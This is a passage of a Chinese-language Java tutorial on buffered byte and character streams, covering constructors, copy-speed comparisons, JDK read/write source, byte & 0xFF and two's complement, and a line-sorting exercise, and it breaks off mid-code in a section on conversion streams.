title="1）构造方法"></a>1）构造方法</h4><ul><li><code>BufferedInputStream(InputStream in)</code> ：创建一个新的缓冲输入流，注意参数类型为<strong>InputStream</strong>。</li><li><code>BufferedOutputStream(OutputStream out)</code>： 创建一个新的缓冲输出流，注意参数类型为<strong>OutputStream</strong>。</li></ul><p>代码示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建字节缓冲输入流，先声明字节流</span></span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">fps</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(b.txt);</span><br><span class="line"><span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(fps)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建字节缓冲输入流（一步到位）</span></span><br><span class="line"><span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;b.txt&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建字节缓冲输出流（一步到位）</span></span><br><span class="line"><span class="type">BufferedOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;b.txt&quot;</span>));</span><br></pre></td></tr></table></figure><h4 id="2）缓冲流的高效"><a href="#2）缓冲流的高效" class="headerlink" title="2）缓冲流的高效"></a>2）缓冲流的高效</h4><p>我们通过复制一个 370M+ 的大文件，来测试缓冲流的效率。为了做对比，我们先用基本流来实现一下，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 记录开始时间</span></span><br><span class="line"><span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"><span class="comment">// 创建流对象</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;py.mp4&quot;</span>);<span class="comment">//exe文件够大</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;copyPy.mp4&quot;</span>))&#123;</span><br><span class="line">    <span class="comment">// 读写数据</span></span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="keyword">while</span> ((b = fis.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">        fos.write(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 记录结束时间</span></span><br><span class="line"><span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">System.out.println(<span class="string">&quot;普通流复制时间:&quot;</span>+(end - start)+<span class="string">&quot; 毫秒&quot;</span>);</span><br></pre></td></tr></table></figure><p>不好意思，我本机比较菜，10 分钟还在复制中。切换到缓冲流试一下，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 记录开始时间</span></span><br><span class="line"><span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"><span class="comment">// 创建流对象</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;py.mp4&quot;</span>));</span><br><span class="line">        <span class="type">BufferedOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;copyPy.mp4&quot;</span>));)&#123;</span><br><span class="line">    <span class="comment">// 读写数据</span></span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="keyword">while</span> ((b = bis.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">        bos.write(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 记录结束时间</span></span><br><span class="line"><span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">System.out.println(<span class="string">&quot;缓冲流复制时间:&quot;</span>+(end - start)+<span class="string">&quot; 毫秒&quot;</span>);</span><br></pre></td></tr></table></figure><p>只需要 8016 毫秒，如何更快呢？</p><p>可以换数组的方式来读写，这个我们前面也有讲到，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 记录开始时间</span></span><br><span class="line"><span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"><span class="comment">// 创建流对象</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;py.mp4&quot;</span>));</span><br><span class="line">        <span class="type">BufferedOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;copyPy.mp4&quot;</span>));)&#123;</span><br><span class="line">    <span class="comment">// 读写数据</span></span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8</span>*<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span> ((len = bis.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        bos.write(bytes, <span class="number">0</span> , len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 记录结束时间</span></span><br><span class="line"><span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">System.out.println(<span class="string">&quot;缓冲流使用数组复制时间:&quot;</span>+(end - start)+<span class="string">&quot; 毫秒&quot;</span>);</span><br></pre></td></tr></table></figure><p>这下就更快了，只需要 521 毫秒。</p><h4 id="3）为什么字节缓冲流会这么快？"><a href="#3）为什么字节缓冲流会这么快？" class="headerlink" title="3）为什么字节缓冲流会这么快？"></a>3）为什么字节缓冲流会这么快？</h4><p>传统的 Java IO 是阻塞模式的，它的工作状态就是“读&#x2F;写，等待，读&#x2F;写，等待。。。。。。”</p><p>字节缓冲流解决的就是这个问题：<strong>一次多读点多写点，减少读写的频率，用空间换时间</strong>。</p><ul><li>减少系统调用次数：在使用字节缓冲流时，数据不是立即写入磁盘或输出流，而是先写入缓冲区，当缓冲区满时再一次性写入磁盘或输出流。这样可以减少系统调用的次数，从而提高 I&#x2F;O 操作的效率。</li><li>减少磁盘读写次数：在使用字节缓冲流时，当需要读取数据时，缓冲流会先从缓冲区中读取数据，如果缓冲区中没有足够的数据，则会一次性从磁盘或输入流中读取一定量的数据。同样地，当需要写入数据时，缓冲流会先将数据写入缓冲区，如果缓冲区满了，则会一次性将缓冲区中的数据写入磁盘或输出流。这样可以减少磁盘读写的次数，从而提高 I&#x2F;O 操作的效率。</li><li>提高数据传输效率：在使用字节缓冲流时，由于数据是以块的形式进行传输，因此可以减少数据传输的次数，从而提高数据传输的效率。</li></ul><p>我们来看 BufferedInputStream 的 read 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">read</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (pos &gt;= count) &#123;     <span class="comment">// 如果当前位置已经到达缓冲区末尾</span></span><br><span class="line">        fill();             <span class="comment">// 填充缓冲区</span></span><br><span class="line">        <span class="keyword">if</span> (pos &gt;= count)   <span class="comment">// 如果填充后仍然到达缓冲区末尾，说明已经读取完毕</span></span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;      <span class="comment">// 返回 -1 表示已经读取完毕</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getBufIfOpen()[pos++] &amp; <span class="number">0xff</span>; <span class="comment">// 返回当前位置的字节，并将位置加 1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码主要有两部分：</p><ul><li><code>fill()</code>：该方法会将缓冲 buf 填满。</li><li><code>getBufIfOpen()[pos++] &amp; 0xff</code>：返回当前读取位置 pos 处的字节（<code>getBufIfOpen()</code>返回的是 buffer 数组，是 byte 类型），并将其与 0xff 进行位与运算。这里的目的是将读取到的字节 b 当做无符号的字节处理，因为 Java 的 byte 类型是有符号的，而将 b 与 0xff 进行位与运算，就可以将其转换为无符号的字节，其范围为 0 到 255。</li></ul><blockquote><p>byte &amp; 0xFF 我们一会再细讲。</p></blockquote><p>再来看 FileInputStream 的 read 方法：</p><p><img src="https://cdn.tobebetterjavaer.com/stutymore/buffer-20230321154534.png"></p><p>在这段代码中，<code>read0()</code> 方法是一个<a href="https://javabetter.cn/oo/native-method.html">本地方法</a>，它的实现是由底层操作系统提供的，并不是 Java 语言实现的。在不同的操作系统上，<code>read0()</code> 方法的实现可能会有所不同，但是它们的功能都是相同的，都是用于<strong>读取一个字节</strong>。</p><p>再来看一下 BufferedOutputStream 的 <code>write(byte b[], int off, int len)</code> 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(<span class="type">byte</span> b[], <span class="type">int</span> off, <span class="type">int</span> len)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (len &gt;= buf.length) &#123;    <span class="comment">// 如果写入的字节数大于等于缓冲区长度</span></span><br><span class="line">        <span class="comment">/* 如果请求的长度超过了输出缓冲区的大小，</span></span><br><span class="line"><span class="comment">           先刷新缓冲区，然后直接将数据写入。</span></span><br><span class="line"><span class="comment">           这样可以避免缓冲流级联时的问题。*/</span></span><br><span class="line">        flushBuffer();          <span class="comment">// 先刷新缓冲区</span></span><br><span class="line">        out.write(b, off, len); <span class="comment">// 直接将数据写入输出流</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (len &gt; buf.length - count) &#123; <span class="comment">// 如果写入的字节数大于空余空间</span></span><br><span class="line">        flushBuffer();              <span class="comment">// 先刷新缓冲区</span></span><br><span class="line">    &#125;</span><br><span class="line">    System.arraycopy(b, off, buf, count, len); <span class="comment">// 将数据拷贝到缓冲区中</span></span><br><span class="line">    count += len;                             <span class="comment">// 更新计数器</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，该方法会检查写入的字节数是否大于等于缓冲区长度，如果是，则先将缓冲区中的数据刷新到磁盘中，然后直接将数据写入输出流。这样做是为了避免缓冲流级联时的问题，即缓冲区的大小不足以容纳写入的数据时，可能会引发级联刷新，导致效率降低。</p><blockquote><p>级联问题（Cascade Problem）是指在一组缓冲流（Buffered Stream）中，由于缓冲区的大小不足以容纳要写入的数据，导致数据被分割成多个部分，并分别写入到不同的缓冲区中，最终需要逐个刷新缓冲区，从而导致性能下降的问题。</p></blockquote><p>其次，如果写入的字节数小于缓冲区长度，则检查缓冲区中剩余的空间是否足够容纳要写入的字节数，如果不够，则先将缓冲区中的数据刷新到磁盘中。然后，使用 <code>System.arraycopy()</code> 方法将要写入的数据拷贝到缓冲区中，并更新计数器 count。</p><p>最后，如果写入的字节数小于缓冲区长度且缓冲区中还有剩余空间，则直接将要写入的数据拷贝到缓冲区中，并更新计数器 count。</p><p>也就是说，只有当 buf 写满了，才会 flush，将数据刷到磁盘，默认一次刷 8192 个字节。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BufferedOutputStream</span><span class="params">(OutputStream out)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(out, <span class="number">8192</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 buf 没有写满，会继续写 buf。</p><p>对比一下 FileOutputStream 的 write 方法，同样是本地方法，一次只能写入一个字节。</p><p><img src="https://cdn.tobebetterjavaer.com/stutymore/buffer-20230321162808.png"></p><p>当把 BufferedOutputStream 和 BufferedInputStream 配合起来使用后，就减少了大量的读写次数，尤其是 <code>byte[] bytes = new byte[8*1024]</code>，就相当于缓冲区的空间有 8 个 1024 字节，那读写效率就会大大提高。</p><h4 id="4）byte-0xFF"><a href="#4）byte-0xFF" class="headerlink" title="4）byte &amp; 0xFF"></a>4）<code>byte &amp; 0xFF</code></h4><p>byte 类型通常被用于存储二进制数据，例如读取和写入文件、网络传输等场景。在这些场景下，byte 类型的变量可以用来存储数据流中的每个字节，从而进行读取和写入操作。</p><p>byte 类型是有符号的，即其取值范围为 -128 到 127。如果我们希望得到的是一个无符号的 byte 值，就需要使用 <code>byte &amp; 0xFF</code> 来进行转换。</p><p>这是因为 0xFF 是一个无符号的整数，它的二进制表示为 11111111。当一个 byte 类型的值与 0xFF 进行位与运算时，会将 byte 类型的值转换为一个无符号的整数，其范围为 0 到 255。</p><p>0xff 是一个十六进制的数，相当于二进制的 11111111，&amp; 运算符的意思是：如果两个操作数的对应位为 1，则输出 1，否则为 0；由于 0xff 有 8 个 1，单个 byte 转成 int 其实就是将 byte 和 int 类型的 255 进行(&amp;)与运算。</p><p>例如，如果我们有一个 byte 类型的变量 b，其值为 -1，那么 b &amp; 0xFF 的结果就是 255。这样就可以将一个有符号的 byte 类型的值转换为一个无符号的整数。</p><p>&amp; 运算是一种二进制数据的计算方式, 两个操作位都为1，结果才为1，否则结果为0. 在上面的 <code>getBufIfOpen()[pos++] &amp; 0xff</code> 计算过程中, byte 有 8bit, OXFF 是16进制的255, 表示的是 int 类型, int 有 32bit.</p><p>如果 <code>getBufIfOpen()[pos++]</code> 为 -118, 那么其原码表示为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000 00000000 00000000 10001010</span><br></pre></td></tr></table></figure><p>反码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11111111 11111111 11111111 11110101</span><br></pre></td></tr></table></figure><p>补码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11111111 11111111 11111111 11110110</span><br></pre></td></tr></table></figure><p>0XFF 表示16进制的数据255, 原码, 反码, 补码都是一样的, 其二进制数据为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000 00000000 00000000 11111111</span><br></pre></td></tr></table></figure><p>0XFF 和 -118 进行&amp;运算后结果为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000 00000000 00000000 11110110</span><br></pre></td></tr></table></figure><p>还原为原码后为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000 00000000 00000000 10001010</span><br></pre></td></tr></table></figure><p>其表示的 int 值为 138，可见将 byte 类型的 -118 与 0XFF 进行与运算后值由 -118 变成了 int 类型的 138，其中低8位和byte的-118完全一致。</p><p>顺带聊一下 原码、反码和补码。</p><p>①、原码</p><p>原码就是符号位加上真值的绝对值，即用第一位表示符号，其余位表示值。比如如果是8位二进制:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+1]原 = 0000 0001</span><br><span class="line"></span><br><span class="line">[-1]原 = 1000 0001</span><br></pre></td></tr></table></figure><p>第一位是符号位。因为第一位是符号位，所以8位二进制数的取值范围就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1111 1111 , 0111 1111]</span><br></pre></td></tr></table></figure><p>即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[-127 , 127]</span><br></pre></td></tr></table></figure><p>②、反码</p><p>反码的表示方法是：</p><ul><li>正数的反码是其本身</li><li>负数的反码是在其原码的基础上，符号位不变，其余各个位取反。</li></ul><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+1] = [00000001]原 = [00000001]反</span><br><span class="line"></span><br><span class="line">[-1] = [10000001]原 = [11111110]反</span><br></pre></td></tr></table></figure><p>可见如果一个反码表示的是负数，人脑无法直观的看出来它的数值。通常要将其转换成原码再计算。</p><p>③、补码</p><p>补码的表示方法是：</p><ul><li>正数的补码就是其本身</li><li>负数的补码是在其原码的基础上，符号位不变，其余各位取反，最后+1。(即在反码的基础上+1)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+1] = [00000001]原 = [00000001]反 = [00000001]补</span><br><span class="line"></span><br><span class="line">[-1] = [10000001]原 = [11111110]反 = [11111111]补</span><br></pre></td></tr></table></figure><p>对于负数，补码表示方式也是人脑无法直观看出其数值的。通常也需要转换成原码在计算其数值。</p><p>从上面可以看到：</p><ul><li>对于正数：原码，反码，补码都是一样的</li><li>对于负数：原码，反码，补码都是不一样的</li></ul><h3 id="02、字符缓冲流"><a href="#02、字符缓冲流" class="headerlink" title="02、字符缓冲流"></a>02、字符缓冲流</h3><p>BufferedReader 类继承自 Reader 类，提供了一些便捷的方法，例如 <code>readLine()</code> 方法可以一次读取一行数据，而不是一个字符一个字符地读取。</p><p>BufferedWriter 类继承自 Writer 类，提供了一些便捷的方法，例如 <code>newLine()</code> 方法可以写入一个系统特定的行分隔符。</p><h4 id="1）构造方法-1"><a href="#1）构造方法-1" class="headerlink" title="1）构造方法"></a>1）构造方法</h4><ul><li><code>BufferedReader(Reader in)</code> ：创建一个新的缓冲输入流，注意参数类型为<strong>Reader</strong>。</li><li><code>BufferedWriter(Writer out)</code>： 创建一个新的缓冲输出流，注意参数类型为<strong>Writer</strong>。</li></ul><p>代码示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建字符缓冲输入流</span></span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;b.txt&quot;</span>));</span><br><span class="line"><span class="comment">// 创建字符缓冲输出流</span></span><br><span class="line"><span class="type">BufferedWriter</span> <span class="variable">bw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;b.txt&quot;</span>));</span><br></pre></td></tr></table></figure><h4 id="2）字符缓冲流特有方法"><a href="#2）字符缓冲流特有方法" class="headerlink" title="2）字符缓冲流特有方法"></a>2）字符缓冲流特有方法</h4><p>字符缓冲流的基本方法与<a href="https://javabetter.cn/io/reader-writer.html">普通字符流</a>调用方式一致，这里不再赘述，我们来看字符缓冲流<strong>特有</strong>的方法。</p><ul><li>BufferedReader：<code>String readLine()</code>: <strong>读一行数据</strong>，读取到最后返回 null</li><li>BufferedWriter：<code>newLine()</code>: <strong>换行</strong>，由系统定义换行符。</li></ul><p>来看 <code>readLine()</code>方法的代码示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建流对象</span></span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;a.txt&quot;</span>));</span><br><span class="line"><span class="comment">// 定义字符串,保存读取的一行文字</span></span><br><span class="line"><span class="type">String</span> <span class="variable">line</span>  <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="comment">// 循环读取,读取到最后返回null</span></span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine())!=<span class="literal">null</span>) &#123;</span><br><span class="line">    System.out.print(line);</span><br><span class="line">    System.out.println(<span class="string">&quot;------&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line">br.close();</span><br></pre></td></tr></table></figure><p>再来看 <code>newLine()</code> 方法的代码示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建流对象</span></span><br><span class="line"><span class="type">BfferedWriter</span> <span class="variable">bw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;b.txt&quot;</span>));</span><br><span class="line"><span class="comment">// 写出数据</span></span><br><span class="line">bw.write(<span class="string">&quot;沉&quot;</span>);</span><br><span class="line"><span class="comment">// 写出换行</span></span><br><span class="line">bw.newLine();</span><br><span class="line">bw.write(<span class="string">&quot;默&quot;</span>);</span><br><span class="line">bw.newLine();</span><br><span class="line">bw.write(<span class="string">&quot;王&quot;</span>);</span><br><span class="line">bw.newLine();</span><br><span class="line">bw.write(<span class="string">&quot;二&quot;</span>);</span><br><span class="line">bw.newLine();</span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line">bw.close();</span><br></pre></td></tr></table></figure><h3 id="03、字符缓冲流练习"><a href="#03、字符缓冲流练习" class="headerlink" title="03、字符缓冲流练习"></a>03、字符缓冲流练习</h3><p>来欣赏一下我写的这篇诗：</p><blockquote><p>6.岑夫子，丹丘生，将进酒，杯莫停。<br>1.君不见黄河之水天上来，奔流到海不复回。<br>8.钟鼓馔玉不足贵，但愿长醉不愿醒。<br>3.人生得意须尽欢，莫使金樽空对月。<br>5.烹羊宰牛且为乐，会须一饮三百杯。<br>2.君不见高堂明镜悲白发，朝如青丝暮成雪。<br>7.与君歌一曲，请君为我倾耳听。<br>4.天生我材必有用，千金散尽还复来。</p></blockquote><p>如何才能按照正确的顺序来呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建map集合,保存文本数据,键为序号,值为文字</span></span><br><span class="line">HashMap&lt;String, String&gt; lineMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建流对象  源</span></span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;logs/test.log&quot;</span>));</span><br><span class="line"><span class="comment">//目标</span></span><br><span class="line"><span class="type">BufferedWriter</span> <span class="variable">bw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;logs/test1.txt&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取数据</span></span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine())!=<span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 解析文本</span></span><br><span class="line">    <span class="keyword">if</span> (line.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    String[] split = line.split(Pattern.quote(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">// 保存到集合</span></span><br><span class="line">    lineMap.put(split[<span class="number">0</span>], split[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line">br.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历map集合</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= lineMap.size(); i++) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> String.valueOf(i);</span><br><span class="line">    <span class="comment">// 获取map中文本</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> lineMap.get(key);</span><br><span class="line">    <span class="comment">// 写出拼接文本</span></span><br><span class="line">    bw.write(key+<span class="string">&quot;.&quot;</span>+value);</span><br><span class="line">    <span class="comment">// 写出换行</span></span><br><span class="line">    bw.newLine();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line">bw.close();</span><br></pre></td></tr></table></figure><h2 id="Java转换流"><a href="#Java转换流" class="headerlink" title="Java转换流"></a>Java转换流</h2><p>转换流可以将一个字节流包装成字符流，或者将一个字符流包装成字节流。这种转换通常用于处理文本数据，如读取文本文件或将数据从网络传输到应用程序。</p><h3 id="01、编码和解码"><a href="#01、编码和解码" class="headerlink" title="01、编码和解码"></a>01、编码和解码</h3><p>在计算机中，数据通常以二进制形式存储和传输。</p><ul><li>编码就是将原始数据（比如说文本、图像、视频、音频等）转换为二进制形式。</li><li>解码就是将二进制数据转换为原始数据，是一个反向的过程。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;沉默王二&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span 